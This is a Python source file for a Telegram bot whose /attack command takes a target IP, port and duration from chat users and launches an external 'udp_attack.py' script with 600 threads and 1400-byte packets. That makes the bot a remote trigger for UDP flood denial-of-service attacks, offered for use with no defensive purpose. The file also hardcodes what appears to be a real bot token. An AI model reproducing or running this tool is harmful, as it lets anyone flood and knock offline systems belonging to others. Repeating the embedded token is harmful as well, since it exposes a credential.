import subprocess
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

def start(update: Update, context: CallbackContext):
    update.message.reply_text("Hi! Use /attack <IP> <port> <duration> to start an attack.")

def attack(update: Update, context: CallbackContext):
    if len(context.args) != 3:
        update.message.reply_text("Usage: /attack <IP> <port> <duration>")
        return

    target_ip = context.args[0]
    target_port = context.args[1]
    duration = context.args[2]
    packet_size = 1400
    num_threads = 600

    command = ["python3", "udp_attack.py", target_ip, target_port, duration, str(packet_size), str(num_threads)]
    update.message.reply_text(f"Starting attack on {target_ip}:{target_port} for {duration} seconds...")

    try:
        result = subprocess.run(command, capture_output=True, text=True)
        update.message.reply_text("Attack finished.")
        update.message.reply_text(f"Output: {result.stdout}")
        if result.stderr:
            update.message.reply_text(f"Errors: {result.stderr}")
    except Exception as e:
        update.message.reply_text(f"An error occurred: {e}")

def main():
    updater = Updater("7230364476:AAEj4oTyDcrlWBe_X0mR5ZccaV3sg0_va4Y")
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack, pass_args=True))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
